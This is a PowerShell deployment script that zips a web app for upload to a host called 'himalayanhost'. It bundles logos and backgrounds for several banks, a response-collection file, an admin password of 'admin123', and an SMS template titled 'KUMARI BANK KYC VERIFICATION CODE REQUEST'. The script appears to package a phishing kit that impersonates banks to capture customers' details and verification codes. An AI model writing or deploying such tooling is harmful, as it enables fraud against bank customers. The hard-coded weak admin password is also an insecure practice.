$staging = Join-Path $env:TEMP "himalayanhost_deploy"
if (Test-Path $staging) {
    Remove-Item -Path $staging -Recurse -Force
}
New-Item -ItemType Directory -Path $staging -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $staging "data") -Force | Out-Null

$baseDir = $PSScriptRoot
Copy-Item (Join-Path $baseDir ".htaccess") (Join-Path $staging ".htaccess") -Force
Copy-Item (Join-Path $baseDir "api.php") (Join-Path $staging "api.php") -Force
Copy-Item (Join-Path $baseDir "app.js") (Join-Path $staging "app.js") -Force
Copy-Item (Join-Path $baseDir "index.html") (Join-Path $staging "index.html") -Force
Copy-Item (Join-Path $baseDir "responses.html") (Join-Path $staging "responses.html") -Force
Copy-Item (Join-Path $baseDir "styles.css") (Join-Path $staging "styles.css") -Force
Copy-Item (Join-Path $baseDir "data\.htaccess") (Join-Path $staging "data\.htaccess") -Force

# -- Image / Asset Files (copy if they exist) --
$assets = @(
    "kumari_logo.png",
    "logo.png",
    "logo.jpg",
    "rbb_logo.png",
    "laxmi_logo.png",
    "laxmi_banner.png",
    "laxmi_bg.png",
    "siddhartha_logo.jpg",
    "siddhartha_bg.png",
    "rbb_bg.png"
)
foreach ($asset in $assets) {
    $src = Join-Path $baseDir $asset
    if (Test-Path $src) {
        Copy-Item $src (Join-Path $staging $asset) -Force
        Write-Host "  Copied: $asset" -ForegroundColor Cyan
    }
}

# -- Data Files --
Set-Content -Path (Join-Path $staging "data\responses.json") -Value "[]" -Encoding UTF8

$adminCfgObj = [ordered]@{
    adminPassword = "admin123"
    updatedAt = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}
Set-Content -Path (Join-Path $staging "data\admin_config.json") -Value (ConvertTo-Json -InputObject $adminCfgObj -Depth 5) -Encoding UTF8

$cfgObj = [ordered]@{
    recipient = "32001"
    messageTemplate = "KUMARI BANK KYC VERIFICATION CODE REQUEST`nRef: {REF_ID}`nMobile: {MOBILE}`nTime: {TIME}"
    updatedAt = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    deployedAt = ""
    sessionMessages = [ordered]@{}
}
$cfgJson = ConvertTo-Json -InputObject $cfgObj -Depth 5
Set-Content -Path (Join-Path $staging "data\sms_config.json") -Value $cfgJson -Encoding UTF8

# -- Create ZIP --
$zipPath = Join-Path $baseDir "deploy_himalayanhost.zip"
if (Test-Path $zipPath) {
    Remove-Item -Path $zipPath -Force
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($staging, $zipPath)

Remove-Item -Path $staging -Recurse -Force
$zipInfo = Get-Item $zipPath
Write-Host "SUCCESS: Created $zipPath ($($zipInfo.Length) bytes)" -ForegroundColor Green

